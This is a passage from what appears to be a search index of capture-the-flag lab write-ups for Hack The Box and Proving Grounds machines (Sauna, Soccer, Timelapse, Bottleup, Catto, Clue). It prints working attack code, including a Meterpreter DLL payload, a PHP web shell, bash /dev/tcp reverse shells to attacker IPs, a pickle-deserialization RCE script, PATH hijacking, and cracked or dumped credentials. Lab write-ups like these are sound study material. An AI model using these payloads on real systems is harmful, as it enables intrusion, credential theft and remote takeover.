(CVE-2021-1675), I prepared for the attack:</p> <ol> <li> <p>Generated a malicious DLL payload: <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4444 -f dll -o payload.dll\n</code></pre></p> </li> <li> <p>Started an SMB server to host the payload: <pre><code>smbserver.py share . -smb2support\n</code></pre></p> </li> <li> <p>Set up a Metasploit handler to receive the connection: <pre><code>msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.42; set lport 4444; exploit\"\n</code></pre></p> </li> <li> <p>Exploited the PrintNightmare vulnerability: <pre><code>python3 CVE-2021-1675.py egotistical-bank.local/fsmith:Thestrokes23@10.129.95.180 '\\\\10.10.16.42\\share\\payload.dll'\n</code></pre></p> </li> </ol>"},{"location":"htb/sauna/#post-exploitation","title":"Post-Exploitation","text":"<p>After gaining a SYSTEM shell through the PrintNightmare exploit, I verified my access: <pre><code>meterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre></p> <p>I was able to navigate to sensitive locations and collect high-value information: <pre><code>meterpreter &gt; cd C:/Users/Administrator/Desktop\nmeterpreter &gt; cat root.txt\n</code></pre></p> <p>This confirmed complete compromise of the domain controller, successfully completing the challenge.</p>"},{"location":"htb/soccer/","title":"Soccer","text":""},{"location":"htb/soccer/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/soccer/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed three open ports: <pre><code>PORT     STATE SERVICE         VERSION\n22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http            nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://soccer.htb/\n9091/tcp open  xmltec-xmlmail?\n</code></pre></p> <p>The HTTP server on port 80 was redirecting to http://soccer.htb, requiring a hosts file update: <pre><code>echo \"10.129.173.77 soccer.htb\" | sudo tee -a /etc/hosts\n</code></pre></p>"},{"location":"htb/soccer/#web-enumeration","title":"Web Enumeration","text":"<p>Visiting the main website on port 80 revealed a standard template site for a soccer club. Further examination of the site structure led to the discovery of a Tiny File Manager installation at: <pre><code>http://soccer.htb/tiny/\n</code></pre></p> <p>Additionally, I identified a potential subdomain from the website content: <pre><code>echo \"10.129.173.77 soc-player.soccer.htb\" | sudo tee -a /etc/hosts\n</code></pre></p> <p>Visiting this subdomain revealed a ticketing system for soccer matches that communicated with a WebSocket server on port 9091.</p>"},{"location":"htb/soccer/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/soccer/#tiny-file-manager","title":"Tiny File Manager","text":"<p>I attempted to access the Tiny File Manager with default credentials and was successful: - Username: admin - Password: admin@123</p> <p>This provided access to the file system with upload capabilities. I noticed that the <code>/tiny/uploads</code> directory was writable.</p>"},{"location":"htb/soccer/#php-web-shell","title":"PHP Web Shell","text":"<p>I created a simple PHP web shell: <pre><code>&lt;?php\nif(isset($_REQUEST['cmd'])){\n    echo \"&lt;pre&gt;\";\n    $cmd = ($_REQUEST['cmd']);\n    system($cmd);\n    echo \"&lt;/pre&gt;\";\n    die;\n}\n?&gt;\n</code></pre></p> <p>I uploaded this shell to <code>/tiny/uploads/shell.php</code> using the file manager's upload functionality. I then accessed it at: <pre><code>http://soccer.htb/tiny/uploads/shell.php?cmd=id\n</code></pre></p> <p>This confirmed command execution as the www-data user.</p>"},{"location":"htb/soccer/#reverse-shell","title":"Reverse Shell","text":"<p>I set up a netcat listener on my attack machine: <pre><code>nc -lvnp 4444\n</code></pre></p> <p>Then executed a reverse shell payload through the web shell: <pre><code>http://soccer.htb/tiny/uploads/shell.php?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.42/4444 0&gt;%261'\n</code></pre></p> <p>This provided a reverse shell as the www-data user.</p>"},{"location":"htb/soccer/#lateral-movement","title":"Lateral Movement","text":""},{"location":"htb/soccer/#websocket-sql-injection","title":"WebSocket SQL Injection","text":"<p>While enumerating the system, I discovered a Node.js application running on port 9091. This was the WebSocket server that was communicating with the soc-player.soccer.htb subdomain.</p> <p>Examining the web application, I identified a ticket checking feature that took an ID parameter and returned ticket information. This parameter appeared vulnerable to SQL injection.</p> <p>I used SQLMap to confirm the vulnerability: <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --data '{\"id\": \"1234\"}' --dbms mysql --batch --level 5 --risk 3\n</code></pre></p> <p>SQLMap confirmed both boolean-based and time-based blind SQL injection vulnerabilities: <pre><code>Parameter: JSON id ((custom) POST) \n    Type: boolean-based blind\n    Title: OR boolean-based blind - WHERE or HAVING clause\n    Payload: {\"id\": \"-1533 OR 9982=9982\"}\n\n    Type: time-based blind\n    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: {\"id\": \"1234 AND (SELECT 5403 FROM (SELECT(SLEEP(5)))gMBy)\"}\n</code></pre></p>"},{"location":"htb/soccer/#database-enumeration","title":"Database Enumeration","text":"<p>I used SQLMap to enumerate the available databases: <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{\"id\": \"1234\"}' --dbms mysql --batch --threads 10\n</code></pre></p> <p>This revealed several databases, including a non-default one called 'soccer_db': <pre><code>available databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] soccer_db\n[*] sys\n</code></pre></p> <p>I then enumerated the tables in the soccer_db database: <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{\"id\": \"1234\"}' --dbms mysql --batch --threads 10\n</code></pre></p> <p>This revealed a single table called 'accounts': <pre><code>Database: soccer_db\n[1 table]\n+----------+\n| accounts |\n+----------+\n</code></pre></p> <p>Finally, I dumped the contents of the accounts table: <pre><code>sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{\"id\": \"1234\"}' --dbms mysql --batch --threads 10\n</code></pre></p> <p>This revealed credentials for a user named 'player': <pre><code>Database: soccer_db\nTable: accounts\n[1 entry]\n+------+-------------------+----------------------+----------+\n| id   | email             | password             | username |\n+------+-------------------+----------------------+----------+\n| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |\n+------+-------------------+----------------------+----------+\n</code></pre></p>"},{"location":"htb/soccer/#ssh-access","title":"SSH Access","text":"<p>With the discovered credentials, I was able to establish an SSH connection: <pre><code>ssh player@soccer.htb\n</code></pre></p> <p>This provided a shell as the player user.</p>"},{"location":"htb/soccer/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/soccer/#setuid-binary-enumeration","title":"SetUID Binary Enumeration","text":"<p>I searched for SetUID binaries that could potentially be exploited: <pre><code>find / -perm -4000 2&gt;/dev/null\n</code></pre></p> <p>This revealed an unusual SetUID binary: <code>/usr/local/bin/doas</code> - an alternative to sudo typically found on OpenBSD systems.</p>"},{"location":"htb/soccer/#doas-configuration","title":"Doas Configuration","text":"<p>I searched for the doas configuration file: <pre><code>find / -name doas.conf 2&gt;/dev/null\n</code></pre></p> <p>This led me to <code>/usr/local/etc/doas.conf</code>, which contained: <pre><code>permit nopass player as root cmd /usr/bin/dstat\n</code></pre></p> <p>This indicated that the player user could run the dstat command as root without a password.</p>"},{"location":"htb/soccer/#dstat-plugin-exploitation","title":"Dstat Plugin Exploitation","text":"<p>Research on dstat revealed that it supports custom plugins written in Python. These plugins are loaded from several directories, including <code>/usr/local/share/dstat/</code>.</p> <p>I checked if I could write to this directory: <pre><code>ls -la /usr/local/share/dstat/\n</code></pre></p> <p>Confirming it was writable, I created a malicious dstat plugin: <pre><code>echo -e 'import os\\n\\nos.system(\"/bin/bash\")' &gt; /usr/local/share/dstat/dstat_exploit.py\n</code></pre></p> <p>I then executed dstat with my custom plugin using doas: <pre><code>doas /usr/bin/dstat --exploit\n</code></pre></p> <p>This provided a root shell, successfully completing the privilege escalation.</p> <pre><code>root@soccer:/home/player# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>"},{"location":"htb/timelapse/","title":"Timelapse - Writeup","text":""},{"location":"htb/timelapse/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/timelapse/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed standard Active Directory services: <pre><code>PORT      STATE SERVICE           VERSION\n53/tcp    open  domain            Simple DNS Plus\n88/tcp    open  kerberos-sec      Microsoft Windows Kerberos\n135/tcp   open  msrpc             Microsoft Windows RPC\n139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp   open  ldap              Microsoft Windows Active Directory LDAP\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ldapssl?\n3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP\n3269/tcp  open  globalcatLDAPssl?\n5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf            .NET Message Framing\n</code></pre></p>"},{"location":"htb/timelapse/#domain-information","title":"Domain Information","text":"<p>From the scan results, I identified domain information: <pre><code>Domain: timelapse.htb\nComputer name: dc01.timelapse.htb\n</code></pre></p> <p>The SSL certificate on port 5986 confirmed WinRM over HTTPS was enabled.</p>"},{"location":"htb/timelapse/#smb-enumeration","title":"SMB Enumeration","text":"<p>I enumerated SMB shares using anonymous access: <pre><code>smbclient -L \\\\\\\\10.129.190.14 -N\n</code></pre></p> <p>This revealed several standard shares plus an additional non-default share named \"Shares\": <pre><code>ADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nShares          Disk      \nSYSVOL          Disk      Logon server share \n</code></pre></p>"},{"location":"htb/timelapse/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/timelapse/#smb-share-content-analysis","title":"SMB Share Content Analysis","text":"<p>I connected to the \"Shares\" share to examine its contents: <pre><code>smbclient \\\\\\\\10.129.190.14\\\\Shares -N\n</code></pre></p> <p>After browsing through the directories, I discovered a password-protected ZIP file: <pre><code>winrm_backup.zip\n</code></pre></p> <p>I downloaded this file for further analysis: <pre><code>get winrm_backup.zip\n</code></pre></p>"},{"location":"htb/timelapse/#zip-file-password-cracking","title":"ZIP File Password Cracking","text":"<p>I used zip2john and John the Ripper to crack the ZIP file password: <pre><code>zip2john winrm_backup.zip &gt; ziphash.txt\njohn ziphash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>This revealed the password: - ZIP Password: supremelegacy</p>"},{"location":"htb/timelapse/#certificate-analysis","title":"Certificate Analysis","text":"<p>After extracting the ZIP file using the cracked password, I found a PFX certificate file: <pre><code>legacyy_dev_auth.pfx\n</code></pre></p> <p>This file type contains both the private key and certificate, commonly used for authentication. Since it was in a folder named \"WinRM Backup,\" it likely contained credentials for WinRM access.</p> <p>I needed to crack the PFX file password: <pre><code>pfx2john legacyy_dev_auth.pfx &gt; pfx.hash\njohn pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>This revealed the password: - PFX Password: thuglegacy</p>"},{"location":"htb/timelapse/#extracting-certificate-and-key","title":"Extracting Certificate and Key","text":"<p>I extracted the certificate and private key from the PFX file: <pre><code>openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out file.key -nodes\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out file.crt\n</code></pre></p>"},{"location":"htb/timelapse/#lateral-movement","title":"Lateral Movement","text":""},{"location":"htb/timelapse/#winrm-authentication-using-certificate","title":"WinRM Authentication Using Certificate","text":"<p>I used Evil-WinRM to establish a connection using the extracted certificate: <pre><code>evil-winrm -i 10.129.190.14 -k file.key -c file.crt -S -r timelapse\n</code></pre></p> <p>This provided access as the user <code>legacyy</code>.</p>"},{"location":"htb/timelapse/#privilege-information-discovery","title":"Privilege Information Discovery","text":"<p>While exploring the system as legacyy, I checked for stored credentials or sensitive information. Using PowerShell's clipboard history, I discovered credentials: <pre><code>Get-Clipboard -Format FileDropList\n</code></pre></p> <p>This revealed a PowerShell command history with credentials: <pre><code>$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\ninvoke-command -computername dc01.timelapse.htb -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}\nget-aduser -filter * -properties *\n</code></pre></p> <p>This disclosed credentials for a service account: - Username: svc_deploy - Password: E3R$Q62^12p7PLlC%KWaxuaV</p>"},{"location":"htb/timelapse/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/timelapse/#lateral-movement-to-service-account","title":"Lateral Movement to Service Account","text":"<p>I established a new connection using the service account credentials: <pre><code>evil-winrm -i 10.129.190.14 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S\n</code></pre></p>"},{"location":"htb/timelapse/#laps-password-discovery","title":"LAPS Password Discovery","text":"<p>After gaining access as svc_deploy, I discovered this account had rights to query Local Administrator Password Solution (LAPS) passwords. I downloaded and imported a LAPS PowerShell module: <pre><code>Import-Module ./LAPS.ps1\nGet-LAPSComputers\n</code></pre></p> <p>This revealed the LAPS-managed local administrator password: <pre><code>dc01.timelapse.htb }e8nD!uV9.S7o50w4Gclw+/u 11/17/2024 12:45:21\n</code></pre></p>"},{"location":"htb/timelapse/#domain-admin-access","title":"Domain Admin Access","text":"<p>With the local administrator password for the domain controller, I established a session as Administrator: <pre><code>evil-winrm -i 10.129.190.14 -u Administrator -p '}e8nD!uV9.S7o50w4Gclw+/u' -S\n</code></pre></p> <p>This provided full domain administrator access, successfully completing the challenge.</p> <p>I verified access by checking administrative privileges: <pre><code>whoami /all\ndir C:\\Users\\Administrator\\Desktop\n</code></pre></p>"},{"location":"pg/","title":"ProvingGrounds Challenges","text":""},{"location":"pg/bottleup/","title":"Bottleup - Writeup","text":""},{"location":"pg/bottleup/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/bottleup/#port-scanning","title":"Port Scanning","text":"<p>A basic port scan revealed only two standard services running: <pre><code>PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n80/tcp   open  http    Bottle web server (Python 3.8.10)\n</code></pre></p>"},{"location":"pg/bottleup/#web-enumeration","title":"Web Enumeration","text":"<p>The target was running a web application built with the Bottle Python framework. Initial exploration of the web interface showed a simple blog application.</p> <p>I performed directory enumeration to identify potential attack vectors: <pre><code>feroxbuster -u http://192.168.185.246:8080 -w /usr/share/wordlists/dirb/common.txt\n</code></pre></p> <p>This revealed several endpoints, including a potentially vulnerable <code>/view</code> endpoint.</p>"},{"location":"pg/bottleup/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/bottleup/#local-file-inclusion-vulnerability","title":"Local File Inclusion Vulnerability","text":"<p>I discovered that the <code>/view</code> endpoint was vulnerable to Local File Inclusion (LFI): <pre><code>http://192.168.185.246:8080/view?page=%252e%252e%252f%252e%252e%252f%2Fproc%2Fself%2Fenviron\n</code></pre></p> <p>This vulnerability allowed me to read system files. I used it to identify the application's execution directory: <pre><code>http://192.168.185.246:8080/view?page=%252e%252e%252f%252e%252e%252f%252fopt%252fbottle-blog%252fapp.py\n</code></pre></p>"},{"location":"pg/bottleup/#application-source-code-disclosure","title":"Application Source Code Disclosure","text":"<p>The LFI vulnerability exposed the application's source code: <pre><code>from bottle import route, run, static_file,template,request,response,error\nfrom config.secret import secret \nimport os \nimport urllib\nimport re\n@route(\"/\")\ndef home():\n    session = request.get_cookie('name',secret=secret)\n    if (not session):\n        session={\"name\":\"guest\"}\n        response.set_cookie('name',session,secret=secret)\n\n    return template('index',name=session['name'])\n\n@route('/static/js/&lt;filename&gt;')\ndef server_static(filename):\n    return static_file(filename, root=os.getcwd()+'/views/js/')\n\n@route('/static/css/&lt;filename&gt;')\ndef server_static(filename):\n    return static_file(filename, root=os.getcwd()+'/views/css/')\n</code></pre></p> <p>I also discovered the application's secret key used for cookie signing: <pre><code>http://192.168.185.246:8080/view?page=%252e%252e%252f%252e%252e%252f/opt/bottle-blog/config/secret.py\n</code></pre></p> <p>This revealed: <pre><code>secret = \"546546DSQ7711DSQDSQXWZ\"\n</code></pre></p>"},{"location":"pg/bottleup/#cookie-manipulation","title":"Cookie Manipulation","text":"<p>I created a script to generate an admin cookie: <pre><code>import pickle\nimport base64\nimport hmac\nimport hashlib\n\ndef tob(s, enc='utf8'):\n    if isinstance(s, str):\n        return s.encode(enc)\n    return b'' if s is None else bytes(s)\n\ndef touni(s, enc='utf8', err='strict'):\n    if isinstance(s, bytes):\n        return s.decode(enc, err)\n    return str(\"\" if s is None else s)\n\ndef create_admin_cookie(secret):\n    session = {\"name\": \"admin\"}\n    d = pickle.dumps([name, session], -1)\n    encoded = base64.b64encode(d)\n    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())\n    return touni(tob('!') + sig + tob('?') + encoded)\n\ncookie = create_admin_cookie(\"546546DSQ7711DSQDSQXWZ\")\nprint(cookie)\n</code></pre></p> <p>This generated: <code>!tha0+wxAFQXZDPeyKFIBuw==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg==</code></p> <p>However, accessing the application with this admin cookie did not provide any additional privileges.</p>"},{"location":"pg/bottleup/#exploitation","title":"Exploitation","text":""},{"location":"pg/bottleup/#python-pickle-deserialization-vulnerability","title":"Python Pickle Deserialization Vulnerability","text":"<p>After further research, I discovered that the Bottle framework's cookie handling was vulnerable to Python Pickle deserialization attacks when using signed cookies.</p> <p>I created an exploit script to leverage this vulnerability: <pre><code>import rich\nfrom rich import print\nfrom rich.console import Console\nimport os\nimport hmac\nimport hashlib\nimport base64\nimport pickle\nimport requests\n\ndef tob(s, enc='utf8'):\n    if isinstance(s, str):\n        return s.encode(enc)\n    return b'' if s is None else bytes(s)\n\ndef touni(s, enc='utf8', err='strict'):\n    if isinstance(s, bytes):\n        return s.decode(enc, err)\n    return str(\"\" if s is None else s)\n\ndef create_cookie(name, value, secret):\n    d = pickle.dumps([name, value], -1)\n    encoded = base64.b64encode(d)\n    sig = base64.b64encode(hmac.new(tob(secret), encoded, digestmod=hashlib.md5).digest())\n    value = touni(tob('!') + sig + tob('?') + encoded)\n    return value\n\nclass PickleRCE(object):\n    def __init__(self, cmd):\n        self.cmd = cmd\n\n    def __reduce__(self):\n        return (exec,(f\"\"\"\nfrom bottle import response\nimport subprocess\nimport base64\noutput = subprocess.check_output('{self.cmd}', shell=True)\nresponse.set_header('X-Flag', base64.b64encode(output))\n\"\"\",))\n\ndef execute_command(cmd):\n    try:\n        session = {\"name\": PickleRCE(cmd)}\n        cookie = create_cookie(\"name\", session, \"546546DSQ7711DSQDSQXWZ\")\n        r = requests.get(\"http://192.168.185.246:8080\", cookies={\"name\": cookie})\n        return base64.b64decode(r.headers[\"x-flag\"]).decode(\"ascii\")\n    except Exception as e:\n        print(\"Something went wrong\")\n        print(e)\n</code></pre></p> <p>Using this script, I was able to execute arbitrary commands on the server and establish a reverse shell: <pre><code>python3 exploit.py \"bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.172/4444 0&gt;&amp;1'\"\n</code></pre></p> <p>I had a listener set up to catch the connection: <pre><code>nc -lvnp 4444\n</code></pre></p> <p>This provided initial access as the <code>hcue</code> user.</p>"},{"location":"pg/bottleup/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/bottleup/#system-service-enumeration","title":"System Service Enumeration","text":"<p>After gaining access as the <code>hcue</code> user, I enumerated the system for privilege escalation vectors: <pre><code>find / -writable -type f -not -path \"/proc/*\" -not -path \"/sys/*\" -not -path \"/dev/*\" -not -path \"/run/*\" -not -path \"/tmp/*\" 2&gt;/dev/null\n</code></pre></p> <p>I discovered two interesting systemd service files: <pre><code>/etc/systemd/system/app.service\n/etc/systemd/system/larj.service\n</code></pre></p> <p>Using <code>pspy</code> to monitor processes, I determined that <code>larj.service</code> was executing a script <code>/opt/larj.sh</code> as root every 60 seconds.</p>"},{"location":"pg/bottleup/#script-analysis","title":"Script Analysis","text":"<p>I examined the contents of <code>/opt/larj.sh</code>: <pre><code>#!/bin/bash\n\n##### Developed by Intern Team Members - \n##### 2022-2023 Project\n\necho -e \"\n#####################################################################\n    CPU Health Check Report\n#####################################################################\n\n\nHostname         : `hostname`\nKernel Version   : `uname -r`\nUptime           : `uptime | sed 's/.*up \\([^,]*\\), .*/\\1/'`\nLast Reboot Time : `who -b | awk '{print $3,$4}'`\n\n\n\n*********************************************************************\nCPU Load - &gt; Threshold &lt; 1 Normal &gt; 1 Caution , &gt; 2 Unhealthy \n*********************************************************************\n\" &gt; /root/status.log\n\nLSCPU=`which lscpu`\nLSCPU=$?\nif [ $LSCPU != 0 ]\nthen\n    RESULT=$RESULT\" lscpu required to producre acqurate reults\"\nelse\ncpus=`lscpu | grep -e \"^CPU(s):\" | cut -f2 -d: | awk '{print $1}'`\ni=0\nwhile [ $i -lt $cpus ]\ndo\n    echo \"CPU$i : `mpstats -P ALL | awk -v var=$i '{ if ($3 == var ) print $4 }' `\" &gt;&gt; /root/status.log\n    let i=$i+1\ndone\nfi\n\necho -e \"\nLoad Average   : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d,`\n\nHeath Status : `uptime | awk -F'load average:' '{ print $2 }' | cut -f1 -d, | awk '{if ($1 &gt; 2) print \"Unhealthy\"; else if ($1 &gt; 1) print \"Caution\"; else print \"Normal\"}'`\n\" &gt;&gt; /root/status.log\n</code></pre></p> <p>I noticed that the script was attempting to execute a command called <code>mpstats</code>, which did not exist on the system.</p>"},{"location":"pg/bottleup/#path-hijacking","title":"PATH Hijacking","text":"<p>I checked the <code>$PATH</code> environment variable: <pre><code>echo $PATH\n/usr/bin:/usr/local/bin:/home/hcue:/home/root:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin\n</code></pre></p> <p>Since the user's home directory was included in the <code>$PATH</code>, I could create a malicious <code>mpstats</code> binary there: <pre><code>cd /home/hcue\necho '#!/bin/bash' &gt; mpstats\necho 'bash -i &gt;&amp; /dev/tcp/192.168.45.172/5555 0&gt;&amp;1' &gt;&gt; mpstats\nchmod +x mpstats\n</code></pre></p> <p>I set up another listener: <pre><code>nc -lvnp 5555\n</code></pre></p> <p>After waiting for the cron job to execute (approximately 60 seconds), I received a reverse shell as the root user, successfully completing the privilege escalation.</p>"},{"location":"pg/catto/","title":"Catto - Writeup","text":""},{"location":"pg/catto/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/catto/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed multiple open ports: <pre><code>PORT      STATE    SERVICE   VERSION\n8080/tcp  open     http      nginx 1.14.1\n18080/tcp open     http      Apache httpd 2.4.37 ((centos))\n30330/tcp open     http      Node.js Express framework\n42022/tcp open     ssh       OpenSSH 8.0 (protocol 2.0)\n43751/tcp open     unknown\n45455/tcp open     http      Node.js Express framework\n50400/tcp open     http      Node.js Express framework\n</code></pre></p> <p>Notable findings: - SSH running on non-standard port 42022 - Multiple web servers running on different ports - Several Node.js Express instances</p>"},{"location":"pg/catto/#web-enumeration","title":"Web Enumeration","text":"<p>I examined each web server to identify potential attack vectors:</p> <ol> <li>Port 8080 (Nginx): <pre><code>feroxbuster -u http://192.168.150.139:8080 -w /usr/share/wordlists/dirb/common.txt\n</code></pre></li> <li>Found <code>/assets</code> and <code>/images</code> directories</li> <li> <p>Discovered a <code>/download</code> endpoint</p> </li> <li> <p>Port 18080 (Apache): <pre><code>feroxbuster -u http://192.168.150.139:18080 -w /usr/share/wordlists/dirb/common.txt\n</code></pre></p> </li> <li>Found a <code>/backup</code> directory containing LaTeX templates and slides</li> <li> <p>Discovered templates: <code>slides_template.tex</code>, <code>php_info.tex</code>, <code>actual_slide.tex</code></p> </li> <li> <p>Port 30330 (Node.js Express): <pre><code>feroxbuster -u http://192.168.150.139:30330 -w /usr/share/wordlists/dirb/common.txt\n</code></pre></p> </li> <li>Found <code>/static</code> and <code>/icons</code> directories</li> <li>Discovered a Minecraft-related subdirectory</li> </ol>"},{"location":"pg/catto/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/catto/#finding-credentials","title":"Finding Credentials","text":"<p>Through further enumeration of the Express server on port 30330, I discovered: - A Minecraft configuration page at: <code>http://192.168.150.139:30330/new-server-config-mc</code> - This revealed a potential password: <code>WallAskCharacter305</code></p> <p>I also found a list of potential usernames at: <code>http://192.168.150.139:30330/minecraft</code> <pre><code>keralis\nxisuma\nzombiecleo\nmumbojumbo\nsabel\nyvette\nzahara\nsybilla\nmarcus\ntabbatha\ntabby\n</code></pre></p>"},{"location":"pg/catto/#ssh-brute-force","title":"SSH Brute Force","text":"<p>I created a username list from the found names and used Hydra to try the discovered password: <pre><code>hydra -s 42022 -L users.txt -p WallAskCharacter305 192.168.150.139 ssh\n</code></pre></p> <p>This revealed working credentials: - Username: marcus - Password: WallAskCharacter305</p>"},{"location":"pg/catto/#establishing-ssh-access","title":"Establishing SSH Access","text":"<p>I connected to the target using SSH on the non-standard port: <pre><code>ssh marcus@192.168.150.139 -p 42022\n</code></pre></p>"},{"location":"pg/catto/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"pg/catto/#credential-discovery","title":"Credential Discovery","text":"<p>After gaining access as user marcus, I began searching for privilege escalation vectors: <pre><code>find /home -type f -exec grep -l \"password\" {} \\; 2&gt;/dev/null\n</code></pre></p> <p>During my enumeration, I discovered a base64-encoded string: <pre><code>F2jJDWaNin8pdk93RLzkdOTr60==\n</code></pre></p> <p>I attempted to decode this string by trying various methods: <pre><code>echo \"F2jJDWaNin8pdk93RLzkdOTr60==\" | base64 -d\n</code></pre></p> <p>The standard base64 decoding didn't work, which suggested it might be using a custom encoding or encryption.</p>"},{"location":"pg/catto/#root-password-discovery","title":"Root Password Discovery","text":"<p>I tried using the SSH password (WallAskCharacter305) as a key for decryption and was able to obtain a string: <pre><code>SortMentionLeast269\n</code></pre></p> <p>Since the system enumeration showed that root was the only other user with shell access, I tried this string as the root password: <pre><code>su -\nPassword: SortMentionLeast269\n</code></pre></p> <p>This was successful, providing immediate root access to the system.</p> <p>I verified full system access: <pre><code>id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre></p> <p>This completed the challenge by successfully escalating privileges to gain full control of the target system.</p>"},{"location":"pg/clue/","title":"Clue - Writeup","text":""},{"location":"pg/clue/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"pg/clue/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed several open services: <pre><code>22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n80/tcp   open  http             Apache httpd 2.4.38\n139/tcp  open  netbios-ssn      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn      Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\n3000/tcp open  http             Sinatra web framework\n8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket\n</code></pre></p>"},{"location":"pg/clue/#smb-enumeration","title":"SMB Enumeration","text":"<p>I tested for anonymous SMB access and found it was allowed: <pre><code>smbclient -L //192.168.178.240/ -N\n</code></pre></p> <p>This revealed a share named \"backup\" that could be accessed without authentication: <pre><code>smbclient //192.168.178.240/backup -N\n</code></pre></p> <p>I mounted the share to examine its contents but found only default installation files. Although there were some configuration files with credentials, these appeared to be the default ones.</p>"},{"location":"pg/clue/#web-enumeration","title":"Web Enumeration","text":"<p>The Apache server on port 80 returned a 403 Forbidden response. However, port 3000 was hosting a Cassandra Web Framework application. Initial exploration of this application revealed it was an interface for managing a Cassandra database.</p>"},{"location":"pg/clue/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"pg/clue/#cassandra-web-framework-vulnerability","title":"Cassandra Web Framework Vulnerability","text":"<p>Further research revealed that the Cassandra Web Framework is vulnerable to a local file read vulnerability. I exploited this to read sensitive files on the system:</p> <pre><code>curl -s \"http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../proc/self/cmdline\"\n</code></pre> <p>This revealed potential credentials for the user cassie: <code>SecondBiteTheApple330</code></p>"},{"location":"pg/clue/#freeswitch-configuration","title":"FreeSWITCH Configuration","text":"<p>Using the same vulnerability, I targeted known configuration files for the FreeSWITCH service that was running on port 8021:</p> <pre><code>curl -s \"http://192.168.178.240:3000/resource/system.schema_keyspaces/../../../../../../etc/freeswitch/autoload_configs/event_socket.conf.xml\"\n</code></pre> <p>This disclosed FreeSWITCH credentials: - Username: (default) - Password: StrongClueConEight021</p>"},{"location":"pg/clue/#freeswitch-exploitation","title":"FreeSWITCH Exploitation","text":"<p>FreeSWITCH's event socket interface on port 8021 is known to be vulnerable to command execution if you have valid credentials. I connected to it and executed commands:</p> <pre><code>nc 192.168.178.240 8021\nauth StrongClueConEight021\nbgapi system /bin/bash -c \"bash -i &gt;&amp; /dev/tcp/192.168.45.183/4444 0&gt;&amp;1\"\n</code></pre> <p>On my attack machine, I had a netcat listener waiting: <pre><code>nc -lvnp 4444\n</code></pre></p> <p>This provided a shell as the freeswitch user.</p>"},{"location":"pg/clue/#lateral-movement","title":"Lateral Movement","text":""},{"location":"pg/clue/#accessing-user-cassie","title":"Accessing User Cassie","text":"<p>From the freeswitch user, I enumerated other users on the system and discovered two accessible users: anthony and cassie. I attempted to switch to the cassie user using the password found earlier:</p> <pre><code>su - cassie\nPassword: SecondBiteTheApple330\n</code></pre> <p>This was successful, providing me with access as the cassie 